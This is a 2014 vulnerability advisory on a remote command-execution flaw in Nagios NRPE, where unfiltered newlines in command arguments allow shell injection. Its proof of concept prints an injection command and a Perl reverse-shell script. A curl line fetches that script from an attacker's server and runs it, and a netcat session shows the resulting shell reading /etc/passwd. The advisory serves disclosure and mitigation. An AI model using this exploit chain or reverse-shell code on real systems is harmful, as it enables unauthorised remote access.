@@ -1,0 +1,234 @@
+=============================================
+- Release date: 17.04.2014
+- Discovered by: Dawid Golunski
+- Severity: High
+=============================================
+
+ 
+I. VULNERABILITY
+-------------------------
+
+NRPE - Nagios Remote Plugin Executor  <= 2.15 Remote Command Execution
+
+ 
+II. BACKGROUND
+-------------------------
+
+Nagios is an open source computer system monitoring, network monitoring and 
+infrastructure monitoring software application. Nagios offers monitoring and
+alerting services for servers, switches, applications, and services. 
+It alerts the users when things go wrong and alerts them a second time when
+the problem has been resolved.
+
+The NRPE (Nagios Remote Plugin Executor) addon is designed to allow you to 
+execute Nagios plugins on remote Linux/Unix machines.
+The main reason for doing this is to allow Nagios to monitor "local" resources 
+(like CPU load, memory usage, etc.) on remote machines. Since these public 
+resources are not usually exposed to external machines, an agent like NRPE must
+be installed on the remote Linux/Unix machines.
+
+
+ 
+III. INTRODUCTION
+-------------------------
+
+Nagios Remote Plugin Executor (NRPE) contains a vulnerability that could 
+allow an attacker to remotely inject and execute arbitrary code on the host 
+under NRPE account (typically 'nagios'). 
+The vulnerability is due to NRPE not properly sanitizing user input before 
+passing it to a command shell as a part of a configured command. 
+In order for an attacker to take advantage of the host NRPE must be compiled
+and configured with command arguments.
+No authentication is required to exploit this vulnerability if the NRPE port 
+has not been protected with a firewall. 
+
+IV. DESCRIPTION
+-------------------------
+ 
+
+NRPE expects definitions of commands in nrpe.cfg config file. Some of the 
+examples given in the config with hardcoded arguments are:
+
+command[check_users]=/usr/local/nagios/libexec/check_users -w 5 -c 10
+command[check_load]=/usr/local/nagios/libexec/check_load -w 15,10,5 -c 30,25,20
+command[check_hda1]=/usr/local/nagios/libexec/check_disk -w 20% -c 10% -p /dev/hda1
+
+when command arguments are enabled then user is also allowed to define 
+commands with variables like:
+
+command[check_users]=/usr/local/nagios/libexec/check_users -w $ARG1$ -c $ARG2$
+command[check_disk]=/usr/local/nagios/libexec/check_disk -w $ARG1$ -c $ARG2$ -p $ARG3$
+
+This is often suggested for convenience in various nagios/nrpe setup tutorials
+on the web.
+
+
+To get a result from a defined command in NRPE daemon the following nrpe client
+can be used with -a option that passes arguments:
+
+# /usr/local/nagios/libexec/check_nrpe  -H 10.10.10.5 -c check_users -a 4 4
+
+USERS OK - 4 users currently logged in |users=4;4;4;0
+
+
+in case check_users command was defined with arguments as shown above 
+NRPE would execute:
+
+/usr/local/nagios/libexec/check_users -w 4 -c 4
+
+on the local system.
+
+
+As we can find in the source code of nrpe-2.15/src/nrpe.c NRPE daemon uses popen() function for
+command execution:
+
+/* executes a system command via popen(), but protects against timeouts */
+int my_system(char *command,int timeout,int *early_timeout,char *output,int output_length){
+----cut----
+                /* run the command */
+                fp=popen(command,"r");
+
+
+using popen() results in the command being executed with the help of a command shell. 
+
+Before this function is reached however NRPE takes several measures to prevent 
+malicious command injection to the shell. That includes filtration based on a blacklist:
+
+#define NASTY_METACHARS         "|`&><'\"\\[]{};"
+
+/* make sure request doesn't contain nasties */
+if(contains_nasty_metachars(pkt->buffer)==TRUE){
+	syslog(LOG_ERR,"Error: Request contained illegal metachars!");
+
+that prevents bash special characters like semicolon, pipe etc. 
+
+The code is also making sure that arguments do not contain bash command substitution 
+i.e. $(ps aux)
+
+if(strstr(macro_argv[x],"$(")) {
+	syslog(LOG_ERR,"Error: Request contained a bash command substitution!");
+	return ERROR;
+
+
+Despite these checks the code is vulnerable to command injection as bash shell allows
+for multiple command execution if commands are separated by a new line. 
+None of the checks examines the arguments for an occurrence of a new line character: 0x0A
+
+ 
+V. PROOF OF CONCEPT
+-------------------------
+ 
+To execute an arbitrary command an attacker could simply add a new line character after
+a parameter and follow it with his own command.
+
+To run touch /tmp/vulntest command an attacker could use the check_nrpe client with arguments:
+
+# /usr/local/nagios/libexec/check_nrpe  -H 10.10.10.5 -c check_users -a "`echo -e "\x0a touch /tmp/vulntest "` #" 4
+
+which make NRPE daemon run the following series of commands:
+
+/usr/local/nagios/libexec/check_users -w <new_line>
+touch /tmp/vulntest
+# -c 4
+
+and a file /tmp/vulntest would be created with nagios user as the owner. The hash character is to comment
+out the the rest of the arguments.
+
+
+An attacker gets a limited set of commands as most of the metacharacters are prohibited by the 
+blacklist. So for example it's difficult to create new files in the system without using > symbol etc.
+
+An attacker could however download a snippet of perl/python etc. code from the web by using wget or
+curl command and get a reverse shell. This would allow unrestricted access to the command line:
+
+---------[revshell.pl on attackers-server]---------
+
+#!/usr/bin/perl
+
+use Socket;
+
+#attackers ip to connect back to
+$i="10.10.10.40";
+
+$p=8080;
+
+socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
+
+if(connect(S,sockaddr_in($p,inet_aton($i))))
+
+{
+	open(STDIN,">&S");
+	open(STDOUT,">&S");
+	open(STDERR,">&S");
+	exec("/bin/sh -i");
+}
+--------------------------------------------------
+
+/usr/local/nagios/libexec/check_nrpe  -H 10.10.10.5 -c check_users -a "`echo -e "\x0a curl -o /tmp/tmp_revshell http://attackers-server/revshell.pl \x0a perl /tmp/tmp_revshell # "` 4 "
+
+
+
+[attacker@10.10.10.40 ]# nc -v -l 8080
+Connection from 10.10.10.5 port 8080 [tcp/ddi-tcp-1] accepted
+sh-4.1$ id
+uid=501(nagios) gid=501(nagios) groups=501(nagios),502(nagcmd)
+sh-4.1$
+sh-4.1$ cat /etc/passwd | head -n 4 ; pwd
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+/
+sh-4.1$ ls -l /tmp/tmp_revshell
+-rw-rw-r-- 1 nagios nagios 269 Apr 17 05:14 /tmp/tmp_revshell
+sh-4.1$ rm -f /tmp/tmp_revshell
+
+
+
+VI. BUSINESS IMPACT
+-------------------------
+
+An attacker could exploit the vulnerability to gain access to the system
+in the context of a nagios user this could lead to further compromise
+of the server.
+ 
+VII. SYSTEMS AFFECTED
+-------------------------
+
+Current version of NRPE 2.15 and older are vulnerable.
+ 
+VIII. SOLUTION
+-------------------------
+
+Disable command arguments if possible.
+Protect access to NRPE port and only allow access from a trusted 
+nagios server.
+Install updated version of NRPE when it becomes available.
+ 
+IX. REFERENCES
+-------------------------
+
+http://www.nagios.org
+http://sourceforge.net/projects/nagios/files/nrpe-2.x/
+http://exchange.nagios.org/directory/Addons/Monitoring-Agents/NRPE--2D-Nagios-Remote-Plugin-Executor/details
+http://legalhackers.com/advisories/nagios-nrpe.txt 
+
+X. CREDITS
+-------------------------
+
+The vulnerability has been discovered by Dawid Golunski
+dawid (at) legalhackers (dot) com
+legalhackers.com
+ 
+XI. REVISION HISTORY
+-------------------------
+
+April 17th, 2014:  Advisory created
+ 
+XII. LEGAL NOTICES
+-------------------------
+
+The information contained within this advisory is supplied "as-is" with
+no warranties or guarantees of fitness of use or otherwise. I accept no
+responsibility for any damage caused by the use or misuse of this information.
+
